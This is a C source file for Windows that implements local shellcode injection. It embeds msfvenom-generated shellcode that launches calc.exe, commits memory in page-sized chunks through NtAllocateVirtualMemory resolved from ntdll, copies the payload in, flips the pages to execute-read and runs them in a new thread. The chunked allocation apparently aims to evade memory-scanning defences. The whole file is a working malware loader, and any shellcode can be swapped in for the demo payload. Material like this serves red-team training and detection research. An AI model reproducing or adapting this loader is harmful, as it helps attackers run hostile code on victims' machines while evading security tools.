#include <windows.h>
#include <stdio.h>

#define		PAGE_SIZE			4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )
#define     NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define     NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

typedef NTSTATUS (WINAPI* fnNtAllocateVirtualMemory)(
    HANDLE      ProcessHandle,
    PVOID       *BaseAddress,
    ULONG_PTR   ZeroBits,
    SIZE_T      RegionSize,
    ULONG       AllocationType,
    ULONG       Protect
);

typedef NTSTATUS (WINAPI* fnNtProtectVirtualMemory)(
    HANDLE      ProcessHandle,
    PVOID       *BaseAddress,
    PSIZE_T     RegionSize,
    ULONG       NewProtect,
    PULONG      OldProtect
);

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
const unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL ChunkAllocatePayload(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload) {
    fnNtAllocateVirtualMemory		pNtAllocateVirtualMemory    = NULL;
    fnNtProtectVirtualMemory		pNtProtectVirtualMemory     = NULL;
	NTSTATUS	                    STATUS			            = 0x00;
	SIZE_T		                    sNewPayloadSize		        = SET_TO_MULTIPLE_OF_4096(sPayloadSize),	// rounded up payload size
			                        sChunkSize		            = PAGE_SIZE;
	DWORD		                    ii			                = sNewPayloadSize / PAGE_SIZE,			    // number of iterations needed 
			                        dwOldPermissions	        = 0x00;
	PVOID		                    pAddress		            = NULL,
			                        pTmpAddress		            = NULL;
	PBYTE		                    pTmpPayload		            = NULL;

    // Fetching NtAllocateVirtualMemory's address from ntdll.dll
    printf("    [*] Fetching NtAllocateVirtualMemory's address from ntdll.dll\n");
    pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtAllocateVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Fetching NtProtectVirtualMemory's address from ntdll.dll
    printf("    [*] Fetching NtProtectVirtualMemory's address from ntdll.dll\n");
    pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtProtectVirtualMemory");
    if (pNtProtectVirtualMemory == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

	// ALLOCATE - COMMIT + RW
	// This can't be allocated in chunks because there is a risk that the next address to reserve is already reserved for another task
	// This will lead NtAllocateVirtualMemory to return 'STATUS_CONFLICTING_ADDRESSES'.
    printf("    [*] Allocating Read Only page\n");
	if (!NT_SUCCESS(STATUS = pNtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY))) {
		return FALSE;
	}

	// Starting from the base address 
	pTmpAddress = pAddress;

	// ALLOCATE - COMMIT + RW
	for (DWORD i = 0; i < ii; i++) {
        printf("    [*] Allocating Chunk\n");
		if (!NT_SUCCESS(STATUS = pNtAllocateVirtualMemory(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE))) {
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	// Starting from the base address 
	pTmpAddress = pAddress;
	pTmpPayload = pPayload;

	// WRITE
	for (DWORD i = 0; i < ii; i++) {
        printf("    [*] Copying Payload\n");
		memcpy(pTmpAddress, pTmpPayload, sChunkSize);

		pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + sChunkSize);
		pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	// Starting from the base address 
	pTmpAddress = pAddress;

	// RX
	for (DWORD i = 0; i < ii; i++) {
        printf("    [*] Changing Chunk Access\n");
		if (!NT_SUCCESS(STATUS = pNtProtectVirtualMemory(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READ, &dwOldPermissions))) {
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	*pInjectedPayload = pAddress;
	return TRUE;
}

int main() {
	HANDLE		hThread			    = NULL;
    SIZE_T      sPayloadSize        = sizeof(Payload);
    PVOID		pAddress            = NULL;

	printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
    printf("[#] Press <Enter> To Allocate %d bytes... ", sPayloadSize);
    getchar();

    if (!ChunkAllocatePayload(Payload, sPayloadSize, &pAddress)) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }

    if (pAddress == NULL) {
        printf("[!] pInjectedPayload NULL!\n");
        return -1;
    }
    printf("[+] DONE \n");

    printf("[#] Press <Enter> To Run The Payload ... ");
    getchar();

    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();
	return 0;
}
